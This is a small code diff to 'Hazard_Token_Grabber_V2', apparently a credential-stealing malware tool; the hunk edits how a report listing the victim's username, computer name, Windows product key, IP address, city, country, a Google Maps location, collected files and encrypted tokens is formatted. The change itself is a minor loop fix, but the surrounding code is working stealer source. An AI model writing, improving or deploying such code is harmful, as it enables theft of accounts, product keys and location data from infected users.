@@ -427,10 +427,10 @@ class Hazard_Token_Grabber_V2:
         description = f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
 
         if len(self.encrypted_tokens) > 0:
-            x = 1
             description += "\n```Encrypted Tokens: "
+            x = len(self.encrypted_tokens) - 1
             for i in self.encrypted_tokens:
-                if len(self.encrypted_tokens) - x != 0:
+                if x != 0:
                     description += f"\n{i}\n"
                 else:
                     description += f"\n{i}"
